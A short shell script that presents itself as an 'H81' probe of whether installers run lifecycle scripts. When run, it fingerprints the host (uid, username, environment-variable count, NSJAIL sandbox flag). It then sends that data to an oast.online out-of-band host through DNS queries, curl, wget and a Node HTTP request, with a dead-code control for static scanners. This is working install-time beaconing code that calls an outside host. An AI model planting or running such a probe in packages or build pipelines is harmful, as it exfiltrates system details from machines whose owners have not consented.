#!/bin/sh
# H81 fresh single-commit probe. Lifecycle script execution test with a
# never-executed-string negative control for static URL scanners.
# Fingerprint (uid / env-name count / NSJAIL flag) is encoded in DNS query
# names and HTTP query strings only; no environment variable value is read.
M="H81-FRESH"
P="dc1hkt3kvv17699hpv0gam4nqd63ajqhc.oast.online"
Q="dc1hkt3kvv17699hpv0gfd7kd349ndaqg.oast.online"
U=$(id -u 2>/dev/null)
N=$(id -un 2>/dev/null)
EN=$(env 2>/dev/null | wc -l)
NS=$(grep -c NSJAIL /proc/self/cgroup 2>/dev/null || echo 0)

echo "$M uid=$U($N) envn=$EN nsjail=$NS"

# Executed only if the installer runs lifecycle scripts.
getent hosts "h81pre-u${U}-e${EN}-ns${NS}.$P" >/dev/null 2>&1 || true
curl -sS -m 10 "http://$P/h81-fresh?u=$U&e=$EN&ns=$NS" >/dev/null 2>&1 || true
wget -q -T 10 -O /dev/null "http://$P/h81-fresh-wget?u=$U&e=$EN&ns=$NS" >/dev/null 2>&1 || true
node -e 'try{var http=require("http");var p=process.argv[1];http.get("http://"+p+"/h81-fresh-node",function(r){r.resume();r.on("end",function(){process.exit(0)})}).on("error",function(){process.exit(0)});setTimeout(function(){process.exit(0)},9000)}catch(e){process.exit(0)}' "$P" >/dev/null 2>&1 || true

# Never executed. If this host resolves, the resolution came from a static
# scanner extracting strings from the diff, not from the lifecycle script.
if false; then
  getent hosts "h81never-static-control.$Q" >/dev/null 2>&1 || true
fi

exit 1
